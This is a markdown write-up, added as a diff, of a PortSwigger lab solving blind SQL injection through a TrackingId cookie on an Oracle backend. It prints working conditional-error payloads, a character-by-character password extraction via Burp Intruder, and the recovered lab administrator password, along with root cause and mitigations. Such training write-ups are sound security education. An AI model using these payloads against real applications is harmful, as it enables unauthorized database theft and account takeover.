@@ -1,0 +1,764 @@
+# Blind SQL Injection with Conditional Errors
+
+**Lab:** Blind SQL injection with conditional errors
+**Category:** SQL Injection
+**Difficulty:** Practitioner
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application was vulnerable to a **Blind SQL Injection** through the `TrackingId` cookie used for analytics.
+
+Although the application did not directly return the results of the injected SQL queries, it exposed a reliable **error-based side channel**. By injecting conditional SQL expressions, it was possible to deliberately trigger a database error when a specified condition was true.
+
+The backend was identified as using an **Oracle database**, based on the requirement to use the `dual` table for standalone `SELECT` statements.
+
+By exploiting conditional errors, it was possible to:
+
+1. Confirm the existence of the `users` table.
+2. Confirm the existence of the `administrator` account.
+3. Determine the length of the administrator's password.
+4. Extract the password character by character using Burp Intruder.
+5. Authenticate as the `administrator` user.
+
+The final password obtained was:
+
+```text
+5grbxecq8nw6nla9ta4y
+```
+
+---
+
+# Vulnerability Classification
+
+| Attribute     | Value                                                                       |
+| ------------- | --------------------------------------------------------------------------- |
+| Vulnerability | Blind SQL Injection – Conditional Error-Based                               |
+| CWE           | CWE-89 – Improper Neutralization of Special Elements used in an SQL Command |
+| OWASP Top 10  | A03:2021 – Injection                                                        |
+| Severity      | High                                                                        |
+| CVSS v3.1     | 8.8 (High)                                                                  |
+
+> The exact CVSS score can vary depending on the real application's privileges, exposed functionality, and impact. The value above is an assessment for this lab scenario.
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy Lab
+
+**Injection Point:**
+
+```http
+Cookie: TrackingId=...
+```
+
+**Database:** Oracle
+
+**Target Account:**
+
+```text
+administrator
+```
+
+---
+
+# Objective
+
+Exploit the blind SQL injection vulnerability in the `TrackingId` cookie to retrieve the password of the `administrator` user and authenticate to the application.
+
+---
+
+# Methodology
+
+1. Identify the injectable `TrackingId` cookie.
+2. Confirm that single quotes produce a database-related error.
+3. Confirm the SQL database type.
+4. Confirm that the `users` table exists.
+5. Identify a conditional error-based SQL injection technique.
+6. Verify the existence of the `administrator` account.
+7. Determine the password length.
+8. Extract each password character using Burp Intruder.
+9. Authenticate as `administrator`.
+
+---
+
+# Initial Enumeration
+
+The application uses a tracking cookie for analytics.
+
+An intercepted request contained a cookie similar to:
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: TrackingId=xyz
+```
+
+The `TrackingId` value was selected as the injection point.
+
+---
+
+# Identifying the SQL Injection
+
+The original value:
+
+```text
+TrackingId=xyz
+```
+
+was modified by appending a single quotation mark:
+
+```text
+TrackingId=xyz'
+```
+
+The application returned an error response.
+
+A second quotation mark was then added:
+
+```text
+TrackingId=xyz''
+```
+
+The error disappeared.
+
+This behavior indicated that the value was probably being incorporated into a SQL query enclosed within a string literal.
+
+---
+
+# Database Identification
+
+A valid SQL expression was first tested:
+
+```text
+TrackingId=xyz'||(SELECT '')||'
+```
+
+This generated an error.
+
+Because the target appeared to use Oracle, the query was modified to use the `dual` table:
+
+```text
+TrackingId=xyz'||(SELECT '' FROM dual)||'
+```
+
+The error disappeared.
+
+This provided strong evidence that the backend database was **Oracle**, since Oracle requires a table reference for this type of `SELECT` statement.
+
+---
+
+# Confirming SQL Execution
+
+To verify that the error response was actually caused by SQL execution, a nonexistent table was referenced:
+
+```text
+TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
+```
+
+The application returned an error.
+
+This confirmed that the injected expression was being interpreted by the backend SQL engine.
+
+---
+
+# Identifying the `users` Table
+
+The existence of the `users` table was tested using:
+
+```text
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+```
+
+The request completed without an error.
+
+The `ROWNUM = 1` condition ensured that the query returned at most one row, preventing the concatenation from failing because of multiple results.
+
+This confirmed that the following table was accessible:
+
+```text
+users
+```
+
+The lab specification indicated that the table contained:
+
+```text
+username
+password
+```
+
+---
+
+# Developing the Conditional Error Technique
+
+The next step was to create an SQL expression that would generate an error only when a particular condition was true.
+
+The following payload was used:
+
+```text
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+
+Because:
+
+```sql
+1=1
+```
+
+is true, the database evaluated:
+
+```sql
+1/0
+```
+
+which generated an error.
+
+The response therefore returned an HTTP 500 status.
+
+The condition was then changed:
+
+```text
+TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+
+Since:
+
+```sql
+1=2
+```
+
+is false, the division by zero was not evaluated.
+
+The application therefore returned a normal response, typically HTTP 200.
+
+The resulting side channel was:
+
+| Condition | HTTP response               |
+| --------- | --------------------------- |
+| True      | `500 Internal Server Error` |
+| False     | `200 OK`                    |
+
+This provided a mechanism for extracting information from the database without directly receiving query results.
+
+---
+
+# Confirming the Administrator Account
+
+The conditional error technique was then combined with a query against the `users` table:
+
+```text
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+The application returned an error.
+
+This confirmed that a row matching:
+
+```text
+username='administrator'
+```
+
+existed in the table.
+
+---
+
+# Determining the Password Length
+
+The next objective was to determine the length of the administrator's password.
+
+The following payload tested whether the password contained more than one character:
+
+```text
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+The test was repeated with increasing values:
+
+```text
+LENGTH(password)>2
+LENGTH(password)>3
+LENGTH(password)>4
+...
+```
+
+The HTTP status was used as the Boolean result.
+
+The process established that:
+
+```text
+LENGTH(password) = 20
+```
+
+Therefore, the password contained exactly 20 characters.
+
+---
+
+# Extracting the Password
+
+Once the password length was known, each character was tested individually.
+
+The `SUBSTR()` function was used to extract a single character:
+
+```sql
+SUBSTR(password,1,1)
+```
+
+The first position was tested using:
+
+```text
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+The character `a` was replaced with payloads containing the possible characters.
+
+The lab specified that the password contained only:
+
+```text
+a-z
+0-9
+```
+
+Therefore, the Intruder payload list consisted of:
+
+```text
+a
+b
+c
+...
+z
+0
+1
+2
+...
+9
+```
+
+---
+
+# Burp Intruder Configuration
+
+The request was sent to **Burp Intruder**.
+
+The payload position was placed around the character being tested:
+
+```text
+SUBSTR(password,1,1)='§a§'
+```
+
+The payload type was configured as:
+
+```text
+Simple list
+```
+
+The attack was then launched.
+
+The significant response was the request returning:
+
+```text
+HTTP 500
+```
+
+while the other candidates returned:
+
+```text
+HTTP 200
+```
+
+The payload associated with the HTTP 500 response represented the correct character.
+
+---
+
+# Password Extraction Process
+
+The same process was repeated for each position.
+
+For position 1:
+
+```sql
+SUBSTR(password,1,1)
+```
+
+For position 2:
+
+```sql
+SUBSTR(password,2,1)
+```
+
+For position 3:
+
+```sql
+SUBSTR(password,3,1)
+```
+
+The process continued until position 20.
+
+The extracted characters were:
+
+| Position | Character |
+| -------- | --------- |
+| 1        | `5`       |
+| 2        | `g`       |
+| 3        | `r`       |
+| 4        | `b`       |
+| 5        | `x`       |
+| 6        | `e`       |
+| 7        | `c`       |
+| 8        | `q`       |
+| 9        | `8`       |
+| 10       | `n`       |
+| 11       | `w`       |
+| 12       | `6`       |
+| 13       | `n`       |
+| 14       | `l`       |
+| 15       | `a`       |
+| 16       | `9`       |
+| 17       | `t`       |
+| 18       | `a`       |
+| 19       | `4`       |
+| 20       | `y`       |
+
+The resulting password was:
+
+```text
+5grbxecq8nw6nla9ta4y
+```
+
+---
+
+# Authentication
+
+The extracted credentials were then used on the application's login page.
+
+Username:
+
+```text
+administrator
+```
+
+Password:
+
+```text
+5grbxecq8nw6nla9ta4y
+```
+
+Authentication was successful and the laboratory was marked as solved.
+
+---
+
+# HTTP Evidence
+
+## Original Request
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: TrackingId=xyz
+```
+
+---
+
+## SQL Syntax Test
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: TrackingId=xyz'
+```
+
+Result:
+
+```text
+HTTP 500
+```
+
+---
+
+## Oracle Detection
+
+```http
+Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'
+```
+
+Result:
+
+```text
+HTTP 200
+```
+
+---
+
+## Conditional Error – True
+
+```http
+Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+
+Result:
+
+```text
+HTTP 500
+```
+
+---
+
+## Conditional Error – False
+
+```http
+Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+
+Result:
+
+```text
+HTTP 200
+```
+
+---
+
+## Password Character Extraction
+
+Example for the first character:
+
+```http
+Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='5' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+When the tested character was correct:
+
+```text
+HTTP 500
+```
+
+When it was incorrect:
+
+```text
+HTTP 200
+```
+
+---
+
+# Technical Analysis
+
+The vulnerability can be represented as follows:
+
+```text
+Attacker
+   │
+   ▼
+TrackingId cookie
+   │
+   ▼
+Application
+   │
+   ▼
+SQL query
+   │
+   ▼
+Oracle Database
+   │
+   ├── Condition TRUE
+   │       │
+   │       ▼
+   │   Division by zero
+   │       │
+   │       ▼
+   │     HTTP 500
+   │
+   └── Condition FALSE
+           │
+           ▼
+       No SQL error
+           │
+           ▼
+         HTTP 200
+```
+
+The application did not directly disclose the SQL query results. However, the distinction between successful and erroneous responses created an **observable Boolean channel**.
+
+This converted the application's error handling into an oracle capable of answering questions about database contents.
+
+---
+
+# Root Cause
+
+The root cause was the direct incorporation of user-controlled input from the `TrackingId` cookie into a SQL query without proper parameterization.
+
+Conceptually, the application behaved similarly to:
+
+```sql
+SELECT ...
+FROM ...
+WHERE tracking_id = '<TrackingId>';
+```
+
+Because the value was concatenated into the SQL statement, an attacker could manipulate the query structure.
+
+The application also exposed database errors through different HTTP responses, creating the conditional error side channel.
+
+---
+
+# Impact
+
+An attacker exploiting this vulnerability could potentially:
+
+* Extract database contents without direct query results.
+* Enumerate database tables.
+* Determine whether specific users exist.
+* Extract usernames and passwords.
+* Retrieve sensitive application data.
+* Potentially compromise user accounts.
+* Escalate the attack depending on database privileges and application functionality.
+
+In this laboratory, exploitation resulted in the compromise of the `administrator` account.
+
+---
+
+# Attack Flow
+
+```text
+Attacker
+   │
+   ▼
+Manipulates TrackingId
+   │
+   ▼
+SQL Injection
+   │
+   ▼
+Conditional SQL expression
+   │
+   ├── TRUE ──► Database error ──► HTTP 500
+   │
+   └── FALSE ─► No error ────────► HTTP 200
+                         │
+                         ▼
+                  Information disclosure
+                         │
+                         ▼
+                  Password extraction
+                         │
+                         ▼
+                administrator account
+```
+
+---
+
+# Security Recommendations
+
+## Use Parameterized Queries
+
+The primary mitigation is to use **prepared statements / parameterized queries** instead of concatenating user-controlled input into SQL statements.
+
+Conceptually:
+
+```sql
+SELECT ...
+FROM ...
+WHERE tracking_id = :tracking_id;
+```
+
+The value supplied by the user should be treated strictly as data rather than SQL syntax.
+
+---
+
+## Do Not Expose Database Errors
+
+Applications should not expose database-specific errors to external users.
+
+Instead of returning different responses depending on internal database errors, the application should implement consistent error handling and return generic responses.
+
+---
+
+## Implement Consistent Error Handling
+
+The application should avoid creating observable differences between:
+
+```text
+SQL success
+```
+
+and:
+
+```text
+SQL error
+```
+
+when those differences can reveal sensitive information.
+
+---
+
+## Apply Least Privilege
+
+The database account used by the application should have only the permissions required by the application.
+
+This limits the potential impact if SQL injection is discovered.
+
+---
+
+## Input Validation as Defense in Depth
+
+Although input validation should not replace parameterized queries, unexpected values in analytics cookies can be rejected or normalized where appropriate.
+
+---
+
+## Security Testing
+
+Applications should be tested for:
+
+* Error-based SQL injection.
+* Blind SQL injection.
+* Time-based SQL injection.
+* Boolean-based SQL injection.
+* Second-order SQL injection.
+
+Particular attention should be paid to cookies and HTTP headers because they are often overlooked as SQL injection sources.
+
+---
+
+# References
+
+* OWASP Top 10 2021 – A03: Injection
+* CWE-89 – Improper Neutralization of Special Elements used in an SQL Command
+* PortSwigger Web Security Academy – SQL Injection
+* PortSwigger Web Security Academy – Blind SQL Injection
+
+---
+
+# Conclusion
+
+The application contained a **Blind SQL Injection vulnerability** in the `TrackingId` cookie.
+
+Although SQL query results were not returned to the attacker, the application's different responses to SQL errors created a reliable Boolean side channel.
+
+By using Oracle-specific SQL syntax and conditional `CASE` expressions containing a division-by-zero error, it was possible to determine whether arbitrary conditions were true.
+
+This technique was used to identify the `administrator` account, determine that its password contained 20 characters, and extract every character individually using Burp Intruder.
+
+The final password obtained was:
+
+```text
+5grbxecq8nw6nla9ta4y
+```
+
+The credentials were successfully used to authenticate as `administrator`, completing the laboratory.
+
+---
+
+# Key Takeaways
+
+* SQL injection can exist even when query results are never displayed.
+* Application errors can create a powerful information-disclosure side channel.
+* HTTP status codes can be used as Boolean indicators during blind SQL injection.
+* Oracle requires special consideration because standalone `SELECT` statements commonly use `dual`.
+* `CASE WHEN` combined with a deliberate database error can turn SQL into a Boolean oracle.
+* Burp Repeater is useful for developing and validating the payload.
+* Burp Intruder can efficiently test possible characters.
+* Parameterized queries are the primary defense against SQL injection.
+
+---
+
+**Lab Status:** ✅ Solved
